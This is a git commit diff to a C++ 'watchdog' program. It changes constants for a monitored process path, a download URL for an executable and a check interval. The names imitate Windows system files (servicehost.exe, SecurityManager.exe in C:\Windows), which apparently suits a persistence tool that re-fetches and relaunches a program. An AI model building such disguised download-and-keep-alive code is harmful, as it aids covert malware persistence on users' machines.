1817506ba68c7a5f2e33e656e4e2301f82eb28b0
Ametero(z) <101631790+Ameterius@users.noreply.github.com>
2024-07-18 04:22:15 +0300

    Main CPP project

--- watchdog.cpp
+++ watchdog.cpp
@@ -9,9 +9,9 @@
 #include <tlhelp32.h>
 #include <fstream>
 
-const std::string PROCESS_PATH = "C:\\ProgramData\\WindowsTasksService\\servicehost.exe";
-const std::string PROCESS_NAME = "servicehost.exe";
-const std::string DOWNLOAD_URL = "https://github.com/Ameterius/links/raw/main/servicehost.exe";
+const std::string PROCESS_PATH = "C:\\Windows\\SecurityManager.exe"; // Path to process for run
+const std::string PROCESS_NAME = "SecurityManager.exe"; // Protected proccess
+const std::string DOWNLOAD_URL = "https://filehost.example/000x000x000/file.exe"; // Link for download (Direct only!)
 const int CHECK_INTERVAL = 5; // Check interval (sec)
 
 bool isProcessRunning(const std::string& processName) {
